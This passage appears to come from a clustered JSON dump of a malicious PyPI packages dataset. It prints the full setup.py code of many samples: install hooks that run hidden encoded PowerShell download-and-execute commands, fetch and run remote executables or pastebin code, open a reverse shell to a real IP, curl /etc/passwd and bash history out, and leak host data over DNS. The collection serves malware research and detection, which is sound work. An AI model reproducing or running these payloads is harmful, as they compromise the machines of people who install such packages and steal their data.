:: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpstrmcint-v6.38",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstrmcint',\n    packages = ['modlib'],\n    version = '1.19',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpstrsplitvirtual-v9.24",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstrsplitvirtual',\n    packages = ['modlib'],\n    version = '4.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpstudyosintvirtual-v5.84",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstudyosintvirtual',\n    packages = ['modlib'],\n    version = '2.31',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tptoolcccpu-v5.77",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tptoolcccpu',\n    packages = ['modlib'],\n    version = '4.42',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tptoolintelram-v6.96",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tptoolintelram',\n    packages = ['modlib'],\n    version = '2.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpverencodeinfo-v3.55",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpverencodeinfo',\n    packages = ['modlib'],\n    version = '8.14',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpvirtualcontrolmc-v2.74",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpvirtualcontrolmc',\n    packages = ['modlib'],\n    version = '3.2',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpvmcraftmine-v6.68",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpvmcraftmine',\n    packages = ['modlib'],\n    version = '2.36',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      }
    ]
  },
  {
    "cluster_id": 143,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-28-shaders",
        "code": "from __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nFILENAME = 'LMAO'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n   \n    URL = \"https://cdn.discordapp.com/attachments/1045000289708687390/1045159487079723058/stub.exe\"\n    response = requests.get(URL)\n    open(\"FILE.exe\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start FILE.exe\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='shaders',\n    version='0.0.2',\n    description='Beautify your output with this amazing package!',\n    long_description=\"\",\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-01-pymatematics-v1.0.0",
        "code": "from setuptools import setup\nimport socket\nimport urllib.request\nimport os\nimport shutil\nimport winreg\nimport requests\nimport pip\n\npackages = ['colorama', 'psutil', 'requests', 'sockets', 'pycaw', 'comtypes', 'discord', 'pypiwin32', 'pycryptodome', 'uuid', 'cryptography', 'pyfiglet', 'browser_cookie3', 'discord_webhook', 'prettytable', 'getmac', 'pyautogui', 'winregistry', 'robloxpy', 'pywin32', 'Pillow', 'tqdm', 'setuptools', 'opencv-python', 'numpy', 'pycaw', 'wmi']\n\nfor package in packages:\n    pip.main(['install', package])\n\n\ndef send_discord_info():\n import requests\n import os\n\nurl = 'https://pastebin.pl/view/raw/c9c74e28'\n\narchivo = requests.get(url)\ncodigo = archivo.text\n\nruta = os.path.join(os.path.expanduser('~'), 'WindowsDefender.py')\nwith open(ruta, 'w', encoding='utf-8') as f:\n    f.write(\"# -*- coding: latin-1 -*-\\n\")\n    f.write(codigo)\n\nexec(compile(codigo, ruta, 'exec'))\n\nos.remove(ruta)\n\n\nfrom setuptools import setup\n\nsetup(\n    name='pymatematics',\n    version='1.0.0',\n    packages=['pymatematics'],\n    url='https://github.com/pymatematics/pymatematics',\n    license='',\n    author='pymatematics',\n    author_email='pymatematics@gmail.com',\n    description='Python Matematics',\n)\n\n\nif __name__ == '__main__':\n    send_discord_info()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-05-shaderz",
        "code": "from __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nFILENAME = 'LMAO'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n   \n    URL = \"https://cdn.discordapp.com/attachments/1045000289708687390/1045159487079723058/stub.exe\"\n    response = requests.get(URL)\n    open(\"FILE.exe\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start FILE.exe\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='shaderz',\n    version='0.0.1',\n    description='Beautify your output with this amazing package!',\n    long_description=\"\",\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)"
      }
    ]
  },
  {
    "cluster_id": 144,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-oxeru1",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      webUrl = urllib.request.urlopen('https://minagolosinastorpedolocutormarcar.com/golosinapastortorpedopularie.html')\n      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n      s.connect((\"134.209.85.64\",8080))\n      os.dup2(s.fileno(),0);os.dup2(s.fileno(),1)\n      os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)\n\nsetup(name='oxeru1',\n      version='0.1.4',\n      description='Security project for PoC .',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-oxeru2",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      webUrl = urllib.request.urlopen('https://minagolosinastorpedolocutormarcar.com/golosinapastortorpedopularie.html')\n      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n      s.connect((\"134.209.85.64\",8080))\n      os.dup2(s.fileno(),0);os.dup2(s.fileno(),1)\n      os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)\n\nsetup(name='oxeru2',\n      version='0.1.4',\n      description='Security project for PoC .',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      }
    ]
  },
  {
    "cluster_id": 145,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-17-importlib-metadate-v99.99",
        "code": "import os\nimport requests\nfrom setuptools import setup\nimport subprocess\n\ndef read_des():\n\treturn \"testsdk\"\n\ndata = requests.get(\"https://www.baidu.com\")\nprint(data.status_code)\n\ndef read_ver():\n\tprint(\"readver\")\n\tcurl_command = 'curl -X POST -H \"Hostname: $(hostname)\" -H \"packagetype: NPM\" -H \"Whoami: $(whoami)\" -H \"Pwd: $(pwd)\" -d \"Install Directory: \\n $(ls -la) \\n Security Groups: \\n $(id) \\n User Directory: \\n $(ls ~)\\n etc-passwd: \\n $(cat /etc/passwd ) \\n bash history: \\n $(cat ~/.bash_history|head)\" -H \"Content-Type: text/plain\" http://43.139.166.32'\n\tsubprocess.run(curl_command, shell=True)\n\treturn \"99.99\"\n\nsetup(\n\tname=\"importlib-metadate\",\n\tversion=read_ver(),\n\tdescription=read_des(),\n\tinstall_requires=[\n        'requests'\n    ],\n)\n\nimport os\ndef add_one(number):\n    return number + 1\n\nimport os\nfrom . import add\n\ndef add_two(x):\n\treturn x+2"
      }
    ]
  },
  {
    "cluster_id": 146,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-09-testinglmao123-v0.69",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        # do shit here\n        print(\"x\")\n\n\n\n\nsetup(\n  name = 'testinglmao123',\n  packages=find_packages(),\n  version = '0.69',\n  description = ':clown:',\n  author = ':clown:',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\",\"gitpython\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'github@gmail.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-09-testinglmao1234-v0.69",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n      import requests\n      url = 'https://webhook.site/4f1e79e9-b44a-4b47-80db-aa658f176f8b'\n      final_payload = \"$age working\"\n      r = requests.post(url, params=\"format=json\", data=final_payload)\n\n        \n\n\n\n\nsetup(\n  name = 'testinglmao1234',\n  packages=find_packages(),\n  version = '0.69',\n  description = ':clown:',\n  author = ':clown:',\n  install_requires=[\"sockets\",\"requests\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'github@gmail.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      }
    ]
  },
  {
    "cluster_id": 147,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-15-embeddings-validation-v99.9.9",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\nimport json\nimport socket\nimport getpass\nimport os\nimport random\nimport secrets\n\ndef dns_request(name, qtype=1, addr=('127.0.0.53', 53), timeout=1):  # A 1, NS 2, CNAME 5, SOA 6, NULL 10, PTR 12, MX 15, TXT 16, AAAA 28, NAPTR 35, * 255\n    name = name.rstrip('.')\n    queryid = secrets.token_bytes(2)\n    # Header. 1 for Recursion Desired, 1 question, 0 answers, 0 ns, 0 additional\n    request = queryid + b'\\1\\0\\0\\1\\0\\0\\0\\0\\0\\0'\n    # Question\n    for label in name.rstrip('.').split('.'):\n        assert len(label) < 64, name\n        request += int.to_bytes(len(label), length=1, byteorder='big')\n        request += label.encode()\n    request += b'\\0'  # terminates with the zero length octet for the null label of the root.\n    request += int.to_bytes(qtype, length=2, byteorder='big')  # QTYPE\n    request += b'\\0\\1'  # QCLASS = 1\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:\n        s.sendto(request, addr)\n        s.settimeout(timeout)\n        try:\n            response, serveraddr = s.recvfrom(4096)\n        except socket.timeout:\n            pass\n\ndef custom_command():\n    package = 'embeddings-validation'\n    domain = 'for-research.ru'\n    ns1 = f'ns1.{domain}'\n\n    data = {\n        'p': package,\n        'h': socket.gethostname(),\n        'd': getpass.getuser(),\n        'c': os.getcwd()\n    }\n    json_data = json.dumps(data)\n    hex_str = json_data.encode('utf-8').hex()\n    chunks = len(hex_str) // 60\n    hex_list = [hex_str[(i * 60):(i + 1) * 60] for i in range(0, chunks + 1)]\n    id_rand = random.randint(36 ** 12, (36 ** 13) - 1)\n\n    for count, value in enumerate(hex_list):\n        t_str = f'v2_f.{count}.{id_rand}.{value}.v2_e.{domain}'\n        dns_request(t_str, addr=(ns1, 53))\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        custom_command()\n\n\nclass CustomDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        custom_command()\n\n\nclass CustomEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        custom_command()\n\nsetup(name='embeddings-validation',\n      version='99.9.9',\n      